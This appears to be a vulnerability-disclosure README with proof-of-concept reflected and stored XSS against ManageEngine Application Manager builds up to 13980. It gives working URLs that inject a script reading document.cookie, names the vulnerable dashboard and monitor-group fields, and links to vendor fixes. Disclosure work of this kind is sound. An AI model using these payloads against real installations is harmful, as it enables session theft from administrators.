# ManageEngine-Application-Manager-XSS-POC
ZOHO Manage Engine Application Manager - XSS POC

### Reflected XSS in ManageEngine Application Manager (13 Build 13970) and prior 
```
https://@IP//showReports.do?actionMethod=generateGlanceReport&period=0&Report=true&resourceType=<script>alert(document.cookie)</script>
```

#### Fix Reference 
* https://www.manageengine.com/products/applications_manager/issues.html#v13980

### Stored XSS in ManageEngine Application Manager (13 Build 13970) and prior 
This version of Application Manager is vulnerable to a stored XSS via the "name" field in the "New Dashboard" and "New Business Dashboards" creation screens that'll be reflected in the "title" of the dashboards.

```
https://@IP/MyPage.do?method=viewDashBoard
```

It's also vulnerable to a stored XSS reflected in the "showapplication" page via the "name" and "description" fields when creating/modifying a monitor group.

#### Fix Reference 
* https://www.manageengine.com/products/applications_manager/issues.html#v13980

### Reflected XSS in ManageEngine Application Manager (13 Build 13980) and prior
The "resourceid" parameter is not santized and is reflecting any code being sent.
```
http://@IP/showReports.do?actionMethod=generateMttrAvailablityReport&resourceid=<script>alert(document.cookie)</script>&period=0&Report=true&resourceType=Monitors
```

#### Fix Reference
* https://www.manageengine.com/products/applications_manager/issues.html#v13990
